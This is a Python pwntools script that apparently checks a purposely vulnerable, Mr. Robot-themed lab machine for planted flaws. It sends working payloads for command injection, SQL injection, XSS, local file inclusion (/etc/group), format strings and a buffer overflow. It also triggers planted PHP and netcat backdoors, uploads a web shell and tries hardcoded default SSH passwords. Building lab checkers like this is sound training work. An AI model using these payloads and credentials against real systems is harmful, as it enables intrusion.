#!/usr/bin/python

from pwn import *
import re
import requests


class test_vulns():
    def __init__(self):
        pass
        
    def test_cmd_injection(self, ip):
        """
        Test for command injection on port 2222
        @param ip: ip address of target
        """
        log.debug("Testing command injection")
        try:
            conn = remote(ip, 2222)
            prompt = conn.recv()
            conn.send(b"ls;ls /home/\n")
            results = conn.recv()
        except:
            log.info("Error connecting to " + ip)
            return None
        conn.close()
        results = results.decode()
        if "elliot" in results:
            log.info(ip + " VULNERABLE to cmd injection")
            return True
        else:
            log.info(ip + " NOT VULNERABLE cmd injection")
            return False

    def test_buffer_overflow(self, ip):
        """
        Test buffer overflow by sending a lot of A characters and checking for a segfault (ie. signal -11).
        Buffer overflow service is running on port 3333
        @param ip: ip address of target
        """
        log.debug("Testing buffer overflow")
        try:
            conn = remote(ip, 3333)
            prompt = conn.recv()
            overflow_string = "A" * 600 + "\n"
            conn.send(bytes(overflow_string,"UTF-8"))
            results = ""
            results = conn.recv()
        except:
            log.info("Error connecting to " + ip)
            return None
        conn.close()
        if "-11" in results.decode():
            log.info(ip + " VULNERABLE to buffer overflow")
            return True
        else:
            log.info(ip + " NOT VULNERABLE to buffer overflow")
            return False

    def test_ssh_default(self, ip, username, pw):
        """
        @param ip: ip address of target
        @param username: ssh username
        @oaram pw: password
        """
        try:
            
            shell = ssh(username, ip, password=pw)
            results = ""
            results = shell["whoami"]
            results = results.decode()
            if username in results:
                log.info(ip + " VULNERABLE to default ssh " + username)
                return True
            if shell:
                shell.close()
        except:
            log.info("Failed to login or connect to ssh " + ip)
            pass
        return False

    def test_backdoor_1(self, ip):
        """
        Test netcat backdoor. Default backdoor is on port 33123
        but the backdoor port will decrement after each successful connection
        @param ip: ip address of target
        """
        log.debug("Testing backdoor 1")
        try:
            conn = remote(ip, 33123)
            results = ""
            if conn:
                conn.send(b"ls /home/\n")
                results = conn.recv()
                results = results.decode()
                conn.close()
            if "elliot" in results:
                log.info(ip + " VULNERABLE to backdoor 1")
                return True
        except:
            pass
        return False

    def test_backdoor_2(self, ip):
        """
        Test the php backdoor that was left on the machine in the images folder
        @param ip: ip address of target
        """
        log.debug("Testing backdoor 2")
        url = "http://" + ip + \
            "/arbitrary_file_upload/images/shell.php?cmd=whoami"
        results = ""
        try:
            results = wget(url)
        except:
            log.info("Error connecting to backdoor 2 " + ip)
            return None
        results = results.decode()
        if "www-data" in results:
            log.info(ip + " VULNERABLE to backdoor 2")
            return True
        else:
            log.info(ip + " NOT VULNERABLE to backdoor 2")
            return False

    def test_lfi(self, ip):
        """
        Test local file inclusion vulnerability. This can be checked by giving a full path
        and without using ../
        @param ip: ip address of target
        """
        log.debug("Testing LFI")
        url = "http://" + ip + "/lfi/lfi.php?language=/etc/group"
        results = ""
        try:
            results = wget(url)
        except:
            log.info("Error performing web request to ")
            return None
        results = results.decode()
        if "mrrobot" in results:
            log.info(ip + " VULNERABLE to lfi")
            return True
        else:
            log.info(ip + " NOT VULNERABLE to lfi")
            return False

    def test_local_format_string(self, ip, username, pw, keyfile=None):
        """
        Test for local format string vulnerability. This can be accessed by jackbauer, chloe, and surnow.
        To verify this vulnerability we can check to see if we can read data off of the stack
        @param ip: ip address of target
        @param username: username to login with over ssh
        @param pw: password to login with over ssh
        """
        log.debug("Testing local format string 0")
        shell = None
        if keyfile:
            try:
                shell = ssh(username, ip, keyfile=keyfile)
            except:
                log.info(
                    "Failed to connect to local format string with key " + ip)
                pass
        if not shell:
            try:
                shell = ssh(username, ip, password=pw)
            except:
                log.info("Failed to connect to local format string " + ip)
                return False
        results = ""
        results = shell[
            "/home/elliot/services/c/formatme_local/printf %x%x%x"]
        results = results.decode()
        evaluation = re.match(
            "[0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f]", results)
        log.info(results)
        if shell:
            shell.close()
        if evaluation:
            log.info(ip + " VULNERABLE to local format string")
            return True
        else:
            log.info(ip + " NOT VULNERABLE to local format string")
            return False
        return False

    def test_reflected_xss(self, ip):
        """
        Test for reflected cross-site scripting (XSS)
        @param ip: ip address of target
        """
        log.debug("Testing reflected XSS")
        url = "http://" + ip + \
            "/xss/xss.php?quote=<img%20src=x%20onerror=alert(1)>"
        results = ""
        try:
            results = wget(url)
        except:
            log.info("Failed to connect to reflected XSS " + ip)
            return None
        results = results.decode()
        if "<img src=x onerror=alert(1)>" in results:
            log.info(ip + " VULNERABLE to reflected xss")
            return True
        else:
            log.info(ip + " NOT VULNERABLE to reflected xss")
            return False

    def test_sqli(self, ip):
        """
        Test for SQL injection (SQLi)
        @param  ip: ip address of target
        """
        log.debug("Testing sqli on " + ip)
        results = ""
        # create SQL injection payload
        payload = {'codename_input': 'a" or 2 LIKE 2-- ', 'submitted': 'TRUE'}
        url = "http://" + ip + "/index.php"
        try:
            results = requests.post(url, data=payload)
            log.debug(results.text)
        except:
            log.info("Failed to connect to sqli " + ip)
            return None
        if "Evil Corp" in results.text:
            log.info(ip + " VULNERABLE to XSS")
            return True
        else:
            log.info(ip + " NOT VULNERABLE to XSS")
            return False

    def test_local_format_string_elliot(self, ip):
        """
        Test local format string vulnerability as chloe user
        """
        log.debug("Testing local format string")
        return self.test_local_format_string(
            ip, "elliot", "fsociety")

    def test_dom_based_xss(self, ip):
        """
        Test for dom based XSS
        @param ip: ip address of target
        """
        log.debug("Testing dom based xss")
        url = "http://" + ip + "/dom_based_xss/index.html"
        try:
            results = wget(url)
        except:
            log.info("Failed to connect to " + ip)
            return None
        if not results:
            return False

        if 'document.write("<a href=" + decodeURIComponent(document.baseURI)' in results.decode():
            log.info(ip + " VULNERABLE to dom based XSS")
            return True
        else:
            return False

    def test_arbitrary_file_upload(self, ip):
        """
        Test for arbitrary file upload. This function requires the existance of a local file called hacker_shell.php
        @param ip: ip address of target
        """
        log.debug("Testing arbitrary file upload")
        url = "http://" + ip + "/arbitrary_file_upload/upload.php"
        try:
            hacker_shell = open('hacker_shell.php', 'rb')
        except:
            log.info(
                "Failed to open local file on server. Make sure hacker_shell.php is in current working directory")
            return None
        files = {'image': hacker_shell}
        try:
            results = requests.post(url, files=files)
        except:
            log.info("Failed to connect to " + ip)
            return None
        url2 = "http://" + ip + \
            "/arbitrary_file_upload/images/hacker_shell.php?cmd=id"
        try:
            results2 = requests.get(url2)
        except:
            return None
        if "www-data" in results2.text:
            log.info(ip + " VULNERABLE to arbitrary file upload")
            return True
        else:
            log.info(ip + " NOT VULNERABLE to arbitrary file upload")
            return False

    def test_ssh_elliot(self, ip):
        log.debug("Testing default ssh elliot")
        return self.test_ssh_default(ip, "elliot", "fsociety")

    def test_ssh_mrrobot(self, ip):
        log.debug("Testing default ssh mrrobot")
        return self.test_ssh_default(ip, "mrrobot", "mrrobot")

    def test_ssh_trenton(self, ip):
        log.debug("Testing default ssh trenton")
        return self.test_ssh_default(ip, "trenton", "trenton")

    def test_ssh_darlene(self, ip):
        log.debug("Testing default ssh darlene")
        return self.test_ssh_default(ip, "darlene", "darlene")

    def test_ssh_leslie(self, ip):
        log.debug("Testing default ssh leslie")
        return self.test_ssh_default(ip, "leslie", "leslie")

    def test_ssh_mobley(self, ip):
        log.debug("Testing default ssh mobley")
        return self.test_ssh_default(ip, "mobley", "mobley")

if __name__ == "__main__":
    ip_addr = "192.168.56.105"
    t = test_vulns()
    context.log_level = "critical"
    print(t.test_arbitrary_file_upload(ip_addr))
    print(t.test_dom_based_xss(ip_addr))
    print(t.test_sqli(ip_addr))
    print(t.test_cmd_injection(ip_addr))
    print(t.test_buffer_overflow(ip_addr))
    print(t.test_ssh_elliot(ip_addr))
    print(t.test_ssh_mrrobot(ip_addr))
    print(t.test_ssh_trenton(ip_addr))
    print(t.test_ssh_darlene(ip_addr))
    print(t.test_ssh_leslie(ip_addr))
    print(t.test_ssh_mobley(ip_addr))
    print(t.test_backdoor_1(ip_addr))
    print(t.test_backdoor_2(ip_addr))
    print(t.test_lfi(ip_addr))
    print(t.test_local_format_string_elliot(ip_addr))
    print(t.test_reflected_xss(ip_addr))
